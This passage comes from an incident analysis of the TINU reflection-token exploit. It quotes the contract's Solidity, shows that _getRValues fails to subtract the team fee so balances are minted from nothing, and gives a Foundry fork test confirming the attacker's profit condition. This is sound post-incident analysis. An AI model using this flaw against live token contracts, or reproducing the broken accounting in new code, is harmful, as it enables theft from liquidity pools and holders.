</span><span id="__span-10-13"><a id="__codelineno-10-13" name="__codelineno-10-13" href="#__codelineno-10-13"></a><span class="w">    </span>_rOwned<span class="p">[</span><span class="kt">address</span><span class="p">(</span><span class="kt">this</span><span class="p">)]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>_rOwned<span class="p">[</span><span class="kt">address</span><span class="p">(</span><span class="kt">this</span><span class="p">)].</span>add<span class="p">(</span>rteam<span class="p">);</span>
</span><span id="__span-10-14"><a id="__codelineno-10-14" name="__codelineno-10-14" href="#__codelineno-10-14"></a><span class="w">    </span><span class="c1">// Come out of thin air</span>
</span><span id="__span-10-15"><a id="__codelineno-10-15" name="__codelineno-10-15" href="#__codelineno-10-15"></a><span class="w">    </span><span class="kt">if</span><span class="p">(</span>_isExcluded<span class="p">[</span><span class="kt">address</span><span class="p">(</span><span class="kt">this</span><span class="p">)])</span>
</span><span id="__span-10-16"><a id="__codelineno-10-16" name="__codelineno-10-16" href="#__codelineno-10-16"></a><span class="w">    </span>_tOwned<span class="p">[</span><span class="kt">address</span><span class="p">(</span><span class="kt">this</span><span class="p">)]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>_tOwned<span class="p">[</span><span class="kt">address</span><span class="p">(</span><span class="kt">this</span><span class="p">)].</span>add<span class="p">(</span>tteam<span class="p">);</span>
</span><span id="__span-10-17"><a id="__codelineno-10-17" name="__codelineno-10-17" href="#__codelineno-10-17"></a><span class="p">}</span>
</span><span id="__span-10-18"><a id="__codelineno-10-18" name="__codelineno-10-18" href="#__codelineno-10-18"></a>
</span><span id="__span-10-19"><a id="__codelineno-10-19" name="__codelineno-10-19" href="#__codelineno-10-19"></a><span class="kt">function</span><span class="w"> </span><span class="nv">_reflectFee</span><span class="p">(</span><span class="kt">uint256</span><span class="w"> </span><span class="nv">rFee</span><span class="p">,</span><span class="w"> </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">tFee</span><span class="p">)</span><span class="w"> </span><span class="kt">private</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-10-20"><a id="__codelineno-10-20" name="__codelineno-10-20" href="#__codelineno-10-20"></a><span class="w">    </span>_rTotal<span class="w"> </span><span class="o">=</span><span class="w"> </span>_rTotal<span class="p">.</span>sub<span class="p">(</span>rFee<span class="p">);</span>
</span><span id="__span-10-21"><a id="__codelineno-10-21" name="__codelineno-10-21" href="#__codelineno-10-21"></a><span class="w">    </span>_tFeeTotal<span class="w"> </span><span class="o">=</span><span class="w"> </span>_tFeeTotal<span class="p">.</span>add<span class="p">(</span>tFee<span class="p">);</span>
</span><span id="__span-10-22"><a id="__codelineno-10-22" name="__codelineno-10-22" href="#__codelineno-10-22"></a><span class="p">}</span>
</span></code></pre></div>
<p>After comparison, we can see that during the transfer process in TINU, besides the fees burned in <code>reflectFee</code>, there is also a teamFee charged, which means transferring a certain amount of tokens to the TINU contract itself.</p>
<div class="language-solidity highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a><span class="kt">function</span><span class="w"> </span><span class="nv">_getValues</span><span class="p">(</span><span class="kt">uint256</span><span class="w"> </span><span class="nv">tAmount</span><span class="p">)</span><span class="w"> </span><span class="kt">private</span><span class="w"> </span>view<span class="w"> </span><span class="kt">returns</span><span class="w"> </span><span class="p">(</span><span class="kt">uint256</span><span class="p">,</span><span class="w"> </span><span class="kt">uint256</span><span class="p">,</span><span class="w"> </span><span class="kt">uint256</span><span class="p">,</span><span class="w"> </span><span class="kt">uint256</span><span class="p">,</span><span class="w"> </span><span class="kt">uint256</span><span class="p">,</span><span class="w"> </span><span class="kt">uint256</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-11-2"><a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a><span class="w">    </span><span class="p">(</span><span class="kt">uint256</span><span class="w"> </span><span class="nv">tTransferAmount</span><span class="p">,</span><span class="w"> </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">tFee</span><span class="p">,</span><span class="w"> </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">tteam</span><span class="p">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>_getTValues<span class="p">(</span>tAmount<span class="p">,</span><span class="w"> </span>_taxFee<span class="p">,</span><span class="w"> </span>_teamFee<span class="p">);</span>
</span><span id="__span-11-3"><a id="__codelineno-11-3" name="__codelineno-11-3" href="#__codelineno-11-3"></a><span class="w">    </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">currentRate</span><span class="w"> </span><span class="o">=</span><span class="w">  </span>_getRate<span class="p">();</span>
</span><span id="__span-11-4"><a id="__codelineno-11-4" name="__codelineno-11-4" href="#__codelineno-11-4"></a><span class="w">    </span><span class="p">(</span><span class="kt">uint256</span><span class="w"> </span><span class="nv">rAmount</span><span class="p">,</span><span class="w"> </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">rTransferAmount</span><span class="p">,</span><span class="w"> </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">rFee</span><span class="p">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>_getRValues<span class="p">(</span>tAmount<span class="p">,</span><span class="w"> </span>tFee<span class="p">,</span><span class="w"> </span>currentRate<span class="p">);</span>
</span><span id="__span-11-5"><a id="__codelineno-11-5" name="__codelineno-11-5" href="#__codelineno-11-5"></a><span class="w">    </span><span class="kt">return</span><span class="w"> </span><span class="p">(</span>rAmount<span class="p">,</span><span class="w"> </span>rTransferAmount<span class="p">,</span><span class="w"> </span>rFee<span class="p">,</span><span class="w"> </span>tTransferAmount<span class="p">,</span><span class="w"> </span>tFee<span class="p">,</span><span class="w"> </span>tteam<span class="p">);</span>
</span><span id="__span-11-6"><a id="__codelineno-11-6" name="__codelineno-11-6" href="#__codelineno-11-6"></a><span class="p">}</span>
</span><span id="__span-11-7"><a id="__codelineno-11-7" name="__codelineno-11-7" href="#__codelineno-11-7"></a>
</span><span id="__span-11-8"><a id="__codelineno-11-8" name="__codelineno-11-8" href="#__codelineno-11-8"></a><span class="kt">function</span><span class="w"> </span><span class="nv">_getTValues</span><span class="p">(</span><span class="kt">uint256</span><span class="w"> </span><span class="nv">tAmount</span><span class="p">,</span><span class="w"> </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">taxFee</span><span class="p">,</span><span class="w"> </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">teamFee</span><span class="p">)</span><span class="w"> </span><span class="kt">private</span><span class="w"> </span>pure<span class="w"> </span><span class="kt">returns</span><span class="w"> </span><span class="p">(</span><span class="kt">uint256</span><span class="p">,</span><span class="w"> </span><span class="kt">uint256</span><span class="p">,</span><span class="w"> </span><span class="kt">uint256</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-11-9"><a id="__codelineno-11-9" name="__codelineno-11-9" href="#__codelineno-11-9"></a><span class="w">    </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">tFee</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>tAmount<span class="p">.</span>mul<span class="p">(</span>taxFee<span class="p">).</span>div<span class="p">(</span><span class="m m-Decimal">100</span><span class="p">);</span>
</span><span id="__span-11-10"><a id="__codelineno-11-10" name="__codelineno-11-10" href="#__codelineno-11-10"></a><span class="w">    </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">tteam</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>tAmount<span class="p">.</span>mul<span class="p">(</span>teamFee<span class="p">).</span>div<span class="p">(</span><span class="m m-Decimal">100</span><span class="p">);</span>
</span><span id="__span-11-11"><a id="__codelineno-11-11" name="__codelineno-11-11" href="#__codelineno-11-11"></a><span class="w">    </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">tTransferAmount</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>tAmount<span class="p">.</span>sub<span class="p">(</span>tFee<span class="p">).</span>sub<span class="p">(</span>tteam<span class="p">);</span>
</span><span id="__span-11-12"><a id="__codelineno-11-12" name="__codelineno-11-12" href="#__codelineno-11-12"></a><span class="w">    </span><span class="kt">return</span><span class="w"> </span><span class="p">(</span>tTransferAmount<span class="p">,</span><span class="w"> </span>tFee<span class="p">,</span><span class="w"> </span>tteam<span class="p">);</span>
</span><span id="__span-11-13"><a id="__codelineno-11-13" name="__codelineno-11-13" href="#__codelineno-11-13"></a><span class="p">}</span>
</span><span id="__span-11-14"><a id="__codelineno-11-14" name="__codelineno-11-14" href="#__codelineno-11-14"></a>
</span><span id="__span-11-15"><a id="__codelineno-11-15" name="__codelineno-11-15" href="#__codelineno-11-15"></a><span class="kt">function</span><span class="w"> </span><span class="nv">_getRValues</span><span class="p">(</span><span class="kt">uint256</span><span class="w"> </span><span class="nv">tAmount</span><span class="p">,</span><span class="w"> </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">tFee</span><span class="p">,</span><span class="w"> </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">currentRate</span><span class="p">)</span><span class="w"> </span><span class="kt">private</span><span class="w"> </span>pure<span class="w"> </span><span class="kt">returns</span><span class="w"> </span><span class="p">(</span><span class="kt">uint256</span><span class="p">,</span><span class="w"> </span><span class="kt">uint256</span><span class="p">,</span><span class="w"> </span><span class="kt">uint256</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-11-16"><a id="__codelineno-11-16" name="__codelineno-11-16" href="#__codelineno-11-16"></a><span class="w">    </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">rAmount</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>tAmount<span class="p">.</span>mul<span class="p">(</span>currentRate<span class="p">);</span>
</span><span id="__span-11-17"><a id="__codelineno-11-17" name="__codelineno-11-17" href="#__codelineno-11-17"></a><span class="w">    </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">rFee</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>tFee<span class="p">.</span>mul<span class="p">(</span>currentRate<span class="p">);</span><span class="w"> </span>
</span><span id="__span-11-18"><a id="__codelineno-11-18" name="__codelineno-11-18" href="#__codelineno-11-18"></a><span class="w">    </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">rTransferAmount</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>rAmount<span class="p">.</span>sub<span class="p">(</span>rFee<span class="p">);</span>
</span><span id="__span-11-19"><a id="__codelineno-11-19" name="__codelineno-11-19" href="#__codelineno-11-19"></a><span class="w">    </span><span class="c1">// Missing sub teamFee</span>
</span><span id="__span-11-20"><a id="__codelineno-11-20" name="__codelineno-11-20" href="#__codelineno-11-20"></a><span class="w">    </span><span class="kt">return</span><span class="w"> </span><span class="p">(</span>rAmount<span class="p">,</span><span class="w"> </span>rTransferAmount<span class="p">,</span><span class="w"> </span>rFee<span class="p">);</span>
</span><span id="__span-11-21"><a id="__codelineno-11-21" name="__codelineno-11-21" href="#__codelineno-11-21"></a><span class="p">}</span>
</span></code></pre></div>
<p>In calculating the relevant values, it can be noted that in the <code>_getRValues</code> function, <code>rTransferAmount</code> is only reduced by <code>rFee</code> without a corresponding reduction in <code>rteam</code>. This causes the <code>rteam</code> in <code>_taketeam</code> to come out of thin air.</p>
<p>For example, if the <code>rAmount</code> of a transfer is 100, with 10% fees and teamFee each, then <code>rFee</code> and <code>rteam</code> are both 10. After the transfer:</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>rOwned[sender] -= 100
</span><span id="__span-12-2"><a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a>rOwned[team] += 10
</span><span id="__span-12-3"><a id="__codelineno-12-3" name="__codelineno-12-3" href="#__codelineno-12-3"></a>rTotal -= 10
</span><span id="__span-12-4"><a id="__codelineno-12-4" name="__codelineno-12-4" href="#__codelineno-12-4"></a>rOwned[receiver] += 90
</span></code></pre></div>
<p>This results in an issuance of <code>rOwned</code> out of thin air, causing <code>rOwned(holder) &gt; rTotal</code>, whereas it should be <code>rOwned[receiver] += 80</code> under normal circumstances.</p>
<div class="language-solidity highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a><span class="kt">function</span><span class="w"> </span><span class="nv">_transfer</span><span class="p">(</span><span class="kt">address</span><span class="w"> </span><span class="nv">sender</span><span class="p">,</span><span class="w"> </span><span class="kt">address</span><span class="w"> </span><span class="nv">recipient</span><span class="p">,</span><span class="w"> </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">amount</span><span class="p">)</span><span class="w"> </span><span class="kt">private</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-13-2"><a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a><span class="w">    </span><span class="p">...</span>
</span><span id="__span-13-3"><a id="__codelineno-13-3" name="__codelineno-13-3" href="#__codelineno-13-3"></a><span class="w">    </span><span class="p">...</span>
</span><span id="__span-13-4"><a id="__codelineno-13-4" name="__codelineno-13-4" href="#__codelineno-13-4"></a><span class="w">    </span><span class="c1">// is the token balance of this contract address over the min number of</span>
</span><span id="__span-13-5"><a id="__codelineno-13-5" name="__codelineno-13-5" href="#__codelineno-13-5"></a><span class="w">    </span><span class="c1">// tokens that we need to initiate a swap?</span>
</span><span id="__span-13-6"><a id="__codelineno-13-6" name="__codelineno-13-6" href="#__codelineno-13-6"></a><span class="w">    </span><span class="c1">// also, don&#39;t get caught in a circular team event.</span>
</span><span id="__span-13-7"><a id="__codelineno-13-7" name="__codelineno-13-7" href="#__codelineno-13-7"></a><span class="w">    </span><span class="c1">// also, don&#39;t swap if sender is uniswap pair.</span>
</span><span id="__span-13-8"><a id="__codelineno-13-8" name="__codelineno-13-8" href="#__codelineno-13-8"></a><span class="w">    </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">contractTokenBalance</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>balanceOf<span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="kt">this</span><span class="p">));</span>
</span><span id="__span-13-9"><a id="__codelineno-13-9" name="__codelineno-13-9" href="#__codelineno-13-9"></a>
</span><span id="__span-13-10"><a id="__codelineno-13-10" name="__codelineno-13-10" href="#__codelineno-13-10"></a><span class="w">    </span><span class="kt">if</span><span class="p">(</span>contractTokenBalance<span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span>_maxTxAmount<span class="p">)</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-13-11"><a id="__codelineno-13-11" name="__codelineno-13-11" href="#__codelineno-13-11"></a><span class="w">        </span>contractTokenBalance<span class="w"> </span><span class="o">=</span><span class="w"> </span>_maxTxAmount<span class="p">;</span>
</span><span id="__span-13-12"><a id="__codelineno-13-12" name="__codelineno-13-12" href="#__codelineno-13-12"></a><span class="w">    </span><span class="p">}</span>
</span><span id="__span-13-13"><a id="__codelineno-13-13" name="__codelineno-13-13" href="#__codelineno-13-13"></a>
</span><span id="__span-13-14"><a id="__codelineno-13-14" name="__codelineno-13-14" href="#__codelineno-13-14"></a><span class="w">    </span><span class="kt">bool</span><span class="w"> </span><span class="nv">overMinTokenBalance</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>contractTokenBalance<span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span>_numOfTokensToExchangeForteam<span class="p">;</span>
</span><span id="__span-13-15"><a id="__codelineno-13-15" name="__codelineno-13-15" href="#__codelineno-13-15"></a><span class="w">    </span><span class="kt">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span>inSwap<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>swapEnabled<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>overMinTokenBalance<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>sender<span class="w"> </span><span class="o">!=</span><span class="w"> </span>uniswapV2Pair<span class="p">)</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-13-16"><a id="__codelineno-13-16" name="__codelineno-13-16" href="#__codelineno-13-16"></a><span class="w">        </span><span class="c1">// We need to swap the current tokens to ETH and send to the team wallet</span>
</span><span id="__span-13-17"><a id="__codelineno-13-17" name="__codelineno-13-17" href="#__codelineno-13-17"></a><span class="w">        </span>swapTokensForEth<span class="p">(</span>contractTokenBalance<span class="p">);</span>
</span><span id="__span-13-18"><a id="__codelineno-13-18" name="__codelineno-13-18" href="#__codelineno-13-18"></a><span class="w">        </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">contractETHBalance</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kt">address</span><span class="p">(</span><span class="kt">this</span><span class="p">).</span>balance<span class="p">;</span>
</span><span id="__span-13-19"><a id="__codelineno-13-19" name="__codelineno-13-19" href="#__codelineno-13-19"></a><span class="w">        </span><span class="kt">if</span><span class="p">(</span>contractETHBalance<span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="m m-Decimal">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-13-20"><a id="__codelineno-13-20" name="__codelineno-13-20" href="#__codelineno-13-20"></a><span class="w">                </span>sendETHToteam<span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="kt">this</span><span class="p">).</span>balance<span class="p">);</span>
</span><span id="__span-13-21"><a id="__codelineno-13-21" name="__codelineno-13-21" href="#__codelineno-13-21"></a><span class="w">        </span><span class="p">}</span>
</span><span id="__span-13-22"><a id="__codelineno-13-22" name="__codelineno-13-22" href="#__codelineno-13-22"></a><span class="w">    </span><span class="p">}</span>
</span><span id="__span-13-23"><a id="__codelineno-13-23" name="__codelineno-13-23" href="#__codelineno-13-23"></a><span class="w">    </span><span class="p">...</span>
</span><span id="__span-13-24"><a id="__codelineno-13-24" name="__codelineno-13-24" href="#__codelineno-13-24"></a><span class="w">    </span><span class="p">...</span>
</span><span id="__span-13-25"><a id="__codelineno-13-25" name="__codelineno-13-25" href="#__codelineno-13-25"></a><span class="p">}</span>
</span><span id="__span-13-26"><a id="__codelineno-13-26" name="__codelineno-13-26" href="#__codelineno-13-26"></a>
</span><span id="__span-13-27"><a id="__codelineno-13-27" name="__codelineno-13-27" href="#__codelineno-13-27"></a><span class="kt">function</span><span class="w"> </span><span class="nv">swapTokensForEth</span><span class="p">(</span><span class="kt">uint256</span><span class="w"> </span><span class="nv">tokenAmount</span><span class="p">)</span><span class="w"> </span><span class="kt">private</span><span class="w"> </span>lockTheSwap<span class="w"> </span><span class="p">{</span>
</span><span id="__span-13-28"><a id="__codelineno-13-28" name="__codelineno-13-28" href="#__codelineno-13-28"></a><span class="w">    </span><span class="c1">// generate the uniswap pair path of token -&gt; weth</span>
</span><span id="__span-13-29"><a id="__codelineno-13-29" name="__codelineno-13-29" href="#__codelineno-13-29"></a><span class="w">    </span><span class="p">[]</span><span class="w"> </span><span class="kt">memory</span><span class="w"> </span>path<span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kt">new</span><span class="w"> </span><span class="kt">address</span><span class="p">[](</span><span class="m m-Decimal">2</span><span class="p">);</span>
</span><span id="__span-13-30"><a id="__codelineno-13-30" name="__codelineno-13-30" href="#__codelineno-13-30"></a><span class="w">    </span>path<span class="p">[</span><span class="m m-Decimal">0</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kt">address</span><span class="p">(</span><span class="kt">this</span><span class="p">);</span>
</span><span id="__span-13-31"><a id="__codelineno-13-31" name="__codelineno-13-31" href="#__codelineno-13-31"></a><span class="w">    </span>path<span class="p">[</span><span class="m m-Decimal">1</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>uniswapV2Router<span class="p">.</span>WETH<span class="p">();</span>
</span><span id="__span-13-32"><a id="__codelineno-13-32" name="__codelineno-13-32" href="#__codelineno-13-32"></a>
</span><span id="__span-13-33"><a id="__codelineno-13-33" name="__codelineno-13-33" href="#__codelineno-13-33"></a><span class="w">    </span>_approve<span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="kt">this</span><span class="p">),</span><span class="w"> </span><span class="kt">address</span><span class="p">(</span>uniswapV2Router<span class="p">),</span><span class="w"> </span>tokenAmount<span class="p">);</span>
</span><span id="__span-13-34"><a id="__codelineno-13-34" name="__codelineno-13-34" href="#__codelineno-13-34"></a>
</span><span id="__span-13-35"><a id="__codelineno-13-35" name="__codelineno-13-35" href="#__codelineno-13-35"></a><span class="w">    </span><span class="c1">// make the swap</span>
</span><span id="__span-13-36"><a id="__codelineno-13-36" name="__codelineno-13-36" href="#__codelineno-13-36"></a><span class="w">    </span>uniswapV2Router<span class="p">.</span>swapExactTokensForETHSupportingFeeOnTransferTokens<span class="p">(</span>
</span><span id="__span-13-37"><a id="__codelineno-13-37" name="__codelineno-13-37" href="#__codelineno-13-37"></a><span class="w">        </span>tokenAmount<span class="p">,</span>
</span><span id="__span-13-38"><a id="__codelineno-13-38" name="__codelineno-13-38" href="#__codelineno-13-38"></a><span class="w">        </span><span class="m m-Decimal">0</span><span class="p">,</span><span class="w"> </span><span class="c1">// accept any amount of ETH</span>
</span><span id="__span-13-39"><a id="__codelineno-13-39" name="__codelineno-13-39" href="#__codelineno-13-39"></a><span class="w">        </span>path<span class="p">,</span>
</span><span id="__span-13-40"><a id="__codelineno-13-40" name="__codelineno-13-40" href="#__codelineno-13-40"></a><span class="w">        </span><span class="kt">address</span><span class="p">(</span><span class="kt">this</span><span class="p">),</span>
</span><span id="__span-13-41"><a id="__codelineno-13-41" name="__codelineno-13-41" href="#__codelineno-13-41"></a><span class="w">        </span><span class="k">block.timestamp</span>
</span><span id="__span-13-42"><a id="__codelineno-13-42" name="__codelineno-13-42" href="#__codelineno-13-42"></a><span class="w">    </span><span class="p">);</span>
</span><span id="__span-13-43"><a id="__codelineno-13-43" name="__codelineno-13-43" href="#__codelineno-13-43"></a><span class="p">}</span>
</span><span id="__span-13-44"><a id="__codelineno-13-44" name="__codelineno-13-44" href="#__codelineno-13-44"></a>
</span><span id="__span-13-45"><a id="__codelineno-13-45" name="__codelineno-13-45" href="#__codelineno-13-45"></a><span class="kt">function</span><span class="w"> </span><span class="nv">sendETHToteam</span><span class="p">(</span><span class="kt">uint256</span><span class="w"> </span><span class="nv">amount</span><span class="p">)</span><span class="w"> </span><span class="kt">private</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-13-46"><a id="__codelineno-13-46" name="__codelineno-13-46" href="#__codelineno-13-46"></a><span class="w">    </span>_teamWalletAddress<span class="p">.</span>transfer<span class="p">(</span>amount<span class="p">.</span>div<span class="p">(</span><span class="m m-Decimal">2</span><span class="p">));</span>
</span><span id="__span-13-47"><a id="__codelineno-13-47" name="__codelineno-13-47" href="#__codelineno-13-47"></a><span class="w">    </span>_marketingWalletAddress<span class="p">.</span>transfer<span class="p">(</span>amount<span class="p">.</span>div<span class="p">(</span><span class="m m-Decimal">2</span><span class="p">));</span>
</span><span id="__span-13-48"><a id="__codelineno-13-48" name="__codelineno-13-48" href="#__codelineno-13-48"></a><span class="p">}</span>
</span></code></pre></div>
<p>In addition, in its <code>transfer</code> function, it checks the TINU balance of the current contract, i.e., whether the total received teamFee exceeds a certain threshold. If so, it exchanges TINU tokens for WETH and transfers the profit out. This gradual influx of the <code>rOwned</code> allocated to the team into the pair makes it possible for condition <span class="arithmatex">\((12)\)</span> for profit to be met.</p>
<div class="language-solidity highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a><span class="kt">function</span><span class="w"> </span><span class="nv">testCondition</span><span class="p">()</span><span class="w"> </span><span class="kt">external</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-14-2"><a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a><span class="w">    </span><span class="kt">uint</span><span class="w"> </span><span class="nv">attackBlockNumber</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m m-Decimal">16489408</span><span class="p">;</span>
</span><span id="__span-14-3"><a id="__codelineno-14-3" name="__codelineno-14-3" href="#__codelineno-14-3"></a><span class="w">    </span>vm<span class="p">.</span>rollFork<span class="p">(</span>attackBlockNumber<span class="p">);</span>
</span><span id="__span-14-4"><a id="__codelineno-14-4" name="__codelineno-14-4" href="#__codelineno-14-4"></a>
</span><span id="__span-14-5"><a id="__codelineno-14-5" name="__codelineno-14-5" href="#__codelineno-14-5"></a><span class="w">    </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">rTotal</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kt">uint256</span><span class="p">(</span>vm<span class="p">.</span>load<span class="p">(</span><span class="kt">address</span><span class="p">(</span>tinu<span class="p">),</span><span class="w"> </span><span class="kt">bytes32</span><span class="p">(</span><span class="kt">uint256</span><span class="p">(</span><span class="m m-Decimal">13</span><span class="p">))));</span>
</span><span id="__span-14-6"><a id="__codelineno-14-6" name="__codelineno-14-6" href="#__codelineno-14-6"></a><span class="w">    </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">rExcluded</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>getMappingValue<span class="p">(</span><span class="kt">address</span><span class="p">(</span>tinu<span class="p">),</span><span class="w"> </span><span class="m m-Decimal">3</span><span class="p">,</span><span class="w"> </span><span class="kt">address</span><span class="p">(</span><span class="mh">0xC77aab3c6D7dAb46248F3CC3033C856171878BD5</span><span class="p">));</span>
</span><span id="__span-14-7"><a id="__codelineno-14-7" name="__codelineno-14-7" href="#__codelineno-14-7"></a><span class="w">    </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">tExcluded</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>getMappingValue<span class="p">(</span><span class="kt">address</span><span class="p">(</span>tinu<span class="p">),</span><span class="w"> </span><span class="m m-Decimal">4</span><span class="p">,</span><span class="w"> </span><span class="kt">address</span><span class="p">(</span><span class="mh">0xC77aab3c6D7dAb46248F3CC3033C856171878BD5</span><span class="p">));</span>
</span><span id="__span-14-8"><a id="__codelineno-14-8" name="__codelineno-14-8" href="#__codelineno-14-8"></a><span class="w">    </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">rPair</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>getMappingValue<span class="p">(</span><span class="kt">address</span><span class="p">(</span>tinu<span class="p">),</span><span class="w"> </span><span class="m m-Decimal">3</span><span class="p">,</span><span class="w"> </span><span class="kt">address</span><span class="p">(</span>tinu_weth<span class="p">));</span>
</span><span id="__span-14-9"><a id="__codelineno-14-9" name="__codelineno-14-9" href="#__codelineno-14-9"></a>
</span><span id="__span-14-10"><a id="__codelineno-14-10" name="__codelineno-14-10" href="#__codelineno-14-10"></a><span class="w">    </span>emit<span class="w"> </span>log_named_uint<span class="p">(</span><span class="s2">&quot;TINU rTotal&quot;</span><span class="p">,</span><span class="w"> </span>rTotal<span class="p">);</span><span class="w">       </span><span class="c1">// 108768187544805713501204846339732808402752408502014790599736522386140496654995</span>
</span><span id="__span-14-11"><a id="__codelineno-14-11" name="__codelineno-14-11" href="#__codelineno-14-11"></a><span class="w">    </span>emit<span class="w"> </span>log_named_uint<span class="p">(</span><span class="s2">&quot;TINU rExcluded&quot;</span><span class="p">,</span><span class="w"> </span>rExcluded<span class="p">);</span><span class="w">  </span><span class="c1">// 3192758909975747822405896956488198123659233150861213276289711491709459543580</span>
</span><span id="__span-14-12"><a id="__codelineno-14-12" name="__codelineno-14-12" href="#__codelineno-14-12"></a><span class="w">    </span>emit<span class="w"> </span>log_named_uint<span class="p">(</span><span class="s2">&quot;TINU tExcluded&quot;</span><span class="p">,</span><span class="w"> </span>tExcluded<span class="p">);</span><span class="w">  </span><span class="c1">// 0</span>
</span><span id="__span-14-13"><a id="__codelineno-14-13" name="__codelineno-14-13" href="#__codelineno-14-13"></a><span class="w">    </span>emit<span class="w"> </span>log_named_uint<span class="p">(</span><span class="s2">&quot;Pair rOwned&quot;</span><span class="p">,</span><span class="w"> </span>rPair<span class="p">);</span><span class="w"> </span><span class="c1">// 108505905800335567462313514886909726810259466467478275604883839519551731249929</span>
</span><span id="__span-14-14"><a id="__codelineno-14-14" name="__codelineno-14-14" href="#__codelineno-14-14"></a><span class="w">    </span>console2<span class="p">.</span>log<span class="p">(</span><span class="s2">&quot;rPair &gt; rSupply?&quot;</span><span class="p">,</span><span class="w"> </span>rPair<span class="w"> </span><span class="o">&gt;</span><span class="w"> </span>rTotal<span class="o">-</span>rExcluded<span class="p">);</span><span class="w"> </span><span class="c1">// true</span>
</span><span id="__span-14-15"><a id="__codelineno-14-15" name="__codelineno-14-15" href="#__codelineno-14-15"></a><span class="p">}</span>
</span></code></pre></div>
<p>Using the above code for testing, it can be confirmed that TINU satisfies <span class="arithmatex">\((12)\)</span>.</p>
<p>It can also be noted that the only excluded address has a <code>tOwned</code> of 0, while <code>rOwned</code> is not 0.</p>
<p><img alt="" src="../../image/230126_TINU.assets/1229.png" /></p>
<p>Analysis reveals that this address was first excluded by the account <a href="https://etherscan.io/address/0x777777f9ef0f0193d2ab2ad4ff7381578119259d">0x777777</a> and then three TINU tokens were locked in it one after another.</p>
<p><img alt="" src="../../image/230126_TINU.assets/1338.png" /></p>
<p>Less than a month later, all TINU tokens locked in it were withdrawn.</p>
<p>So this is because after the account was excluded, due to the reflection mechanism in the transfer, the rate kept decreasing. Therefore, for the fixed TINU balance (<code>tOwned</code>) in the excluded account, the final withdrawal corresponds to a smaller <code>rOwned</code>, resulting in a <code>rOwned</code> remainder.</p>
<hr />
